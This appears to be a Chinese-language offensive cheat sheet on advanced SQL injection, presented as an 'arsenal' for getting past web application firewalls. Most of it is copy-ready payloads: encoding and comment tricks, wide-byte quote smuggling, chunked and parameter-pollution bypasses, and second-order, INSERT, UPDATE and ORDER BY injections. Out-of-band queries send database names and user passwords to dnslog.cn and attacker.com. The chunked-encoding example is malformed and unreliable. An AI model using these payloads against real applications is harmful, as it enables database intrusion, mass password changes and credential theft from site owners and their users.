# Advanced SQLi & WAF Bypass — 高级注入与绕过技术

> WAF 绕过、二阶注入、OOB 带外、ORDER BY/INSERT/UPDATE 注入——当基础手法被拦截时的进阶武器库。

## 关键词

`WAF绕过` `二阶SQL注入` `OOB带外注入` `DNSLog` `ORDER BY注入` `INSERT注入` `UPDATE注入` `宽字节注入` `GBK绕过` `multipart绕过` `HPP` `HTTP参数污染` `chunked编码` `分块传输`

## 1. WAF 深度绕过

### 1.1 等价运算符

```sql
AND → &&
OR  → ||
=   → LIKE / REGEXP / BETWEEN / IN / < >
空格→ /**/ / %09 / %0a / %0d / %0c / %a0 / +
```

### 1.2 HTTP 层绕过

```http
# HPP (HTTP Parameter Pollution)
GET /?id=1&id=2 UNION SELECT 1,2,3--

# 分块传输
POST /api HTTP/1.1
Transfer-Encoding: chunked

1
i
1
d
0
=1 UNION SELECT 1,2--

# multipart 绕过
Content-Type: multipart/form-data; boundary=----
```

### 1.3 函数等价替换

```sql
-- SLEEP 替换
SLEEP(3) → BENCHMARK(5000000,MD5(1))
SLEEP(3) → (SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B, information_schema.columns C)

-- GROUP_CONCAT 替换
GROUP_CONCAT(col) → (SELECT GROUP_CONCAT(col) FROM ...)

-- database() 替换
database() → SCHEMA()

-- 字符串拼接
CONCAT(a,b) → CONCAT_WS('',a,b)

-- 子查询绕过
SELECT ... FROM ... → 使用表别名 + 多重嵌套
```

### 1.4 编码绕过

```sql
-- Hex 编码
SELECT 0x3f3f3f
INSERT INTO users VALUES (0x61646d696e, 0x70617373)

-- CHAR() 编码
SELECT CHAR(115,101,108,101,99,116) → 'select'

-- 宽字节 (GBK/GB2312)
%bf%27 → 縗' (0xbf5c = GBK字符, 0x27 = 未转义引号)
%df%27 → 運'
%aa%27 → 猻'
```

### 1.5 内联注释绕过

```sql
/*!50000SELECT*/     -- MySQL >= 5.0.0
/*!50726SELECT*/     -- MySQL >= 5.7.26
```

## 2. 二阶 SQL 注入

### 2.1 原理

恶意数据先存储到数据库（绕过第一层 WAF），后在另一处查询时触发。

```
用户注册 → username="admin'--" → 存入数据库
修改密码 → UPDATE users SET pass='xxx' WHERE username='admin'--'
         → WHERE 条件被注释 → 修改了所有用户密码
```

### 2.2 常见注入点

```sql
-- 注册时注入 username
INSERT INTO users (username) VALUES ('admin'--')

-- 订单提交时注入 input 字段
INSERT INTO orders (input) VALUES ('1' UNION SELECT 1,2,3--')

-- 读取时触发
SELECT * FROM orders WHERE input = '1' UNION SELECT 1,2,3--'
```

## 3. OOB 带外注入 (Out-of-Band)

### 3.1 DNS 带外 (MySQL, Windows)

```sql
-- 数据库名外带
SELECT LOAD_FILE(CONCAT('\\\\',database(),'.dnslog.cn\\a'))

-- 表名外带
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT table_name FROM information_schema.tables LIMIT 0,1),'.dnslog.cn\\a'))

-- 数据外带
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 0,1),'.dnslog.cn\\a'))
```

### 3.2 HTTP 带外 (Oracle)

```sql
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE ROWNUM=1)) FROM DUAL
```

### 3.3 SMB 带外 (MSSQL)

```sql
EXEC xp_dirtree '\\attacker.com\share',1,1
```

## 4. INSERT 注入

```sql
-- 报错注入
INSERT INTO users VALUES ('admin','1' AND extractvalue(1,concat(0x7e,database()))--','1')

-- 时间注入
INSERT INTO users VALUES ('admin','1' AND (SELECT SLEEP(3))--','1')

-- 子查询注入
INSERT INTO users VALUES ('admin',(SELECT password FROM users LIMIT 0,1),'1')
```

## 5. UPDATE 注入

```sql
-- 修改其他用户密码
UPDATE users SET password='newpass' WHERE username='admin' OR '1'='1'

-- 报错提取
UPDATE users SET password='new' WHERE username='admin' AND extractvalue(1,concat(0x7e,database()))--

-- 时间盲注
UPDATE users SET password='new' WHERE username='admin' AND SLEEP(3)--
```

## 6. ORDER BY 注入

```sql
-- 布尔盲注
?order=username ASC
?order=(CASE WHEN (1=1) THEN username ELSE password END)

-- 时间盲注
?order=(SELECT IF(1=1,SLEEP(3),0))

-- 报错注入
?order=extractvalue(1,concat(0x7e,database()))

-- 联合查询 (需要括号闭合)
?order=(SELECT 1 UNION SELECT 2)
```

## 7. LIMIT / OFFSET 注入 (PostgreSQL)

```sql
?limit=1 UNION SELECT 1,2,3--
```

## 8. PROCEDURE ANALYSE 注入

```sql
?id=1 PROCEDURE ANALYSE(extractvalue(1,concat(0x7e,database())),1)--
```

## 9. 关联技术

- [[01-sqli-fundamentals]] — SQL 注入基础
- [[03-nosql-injection]] — NoSQL 注入
- [[06-card-platform]] — 发卡平台实战
- [[sqli-nosqli]] — SQL/NoSQL 注入
